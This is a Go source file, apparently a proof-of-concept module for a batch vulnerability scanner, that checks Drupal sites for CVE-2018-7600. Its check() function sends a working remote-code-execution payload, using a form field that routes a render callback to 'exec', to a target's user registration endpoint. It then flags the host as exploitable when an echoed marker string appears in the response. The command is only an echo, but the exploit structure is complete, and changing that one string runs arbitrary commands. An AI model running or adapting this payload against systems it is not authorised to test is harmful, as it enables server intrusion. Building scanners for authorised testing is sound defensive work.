package poc

import (
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"

	"../logger"
)

// DrupalRCE - CVE-2018-7600
type DrupalRCE struct {
	target      string
	Exploitable bool
}

// NewDrupalRCE .
func NewDrupalRCE() *DrupalRCE {
	return &DrupalRCE{}
}

// Set implements PoC interface.
// Params should be {target string}
func (d *DrupalRCE) Set(v ...interface{}) {
	d.target = v[0].(string)
}

// Report implements PoC interface.
// For batch scan.
func (d *DrupalRCE) Report() map[string]interface{} {
	return map[string]interface{}{
		"host":        d.target,
		"exploitable": d.Exploitable,
	}
}

// Run implements PoC interface.
func (d *DrupalRCE) Run() {
	logger.Green.Println("Checking Drupal RCE (CVE-2018-7600)...")
	d.check()
	logger.Blue.Println(d.target, d.Exploitable)
}

func (d *DrupalRCE) check() {
	cmd := `echo "AssassinGooo"`
	payload := url.Values{}
	payload.Add("form_id", "user_register_form")
	payload.Add("_drupal_ajax", "1")
	payload.Add("mail[#post_render][]", "exec")
	payload.Add("mail[#type]", "markup")
	payload.Add("mail[#markup]", cmd)

	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	req, err := http.NewRequest("POST",
		"http://"+d.target+"/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
		strings.NewReader(payload.Encode()))
	if err != nil {
		logger.Red.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0")

	resp, err := client.Do(req)
	if err != nil {
		logger.Red.Println(err)
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	if strings.Contains(string(body), "AssassinGooo") {
		d.Exploitable = true
	}
}
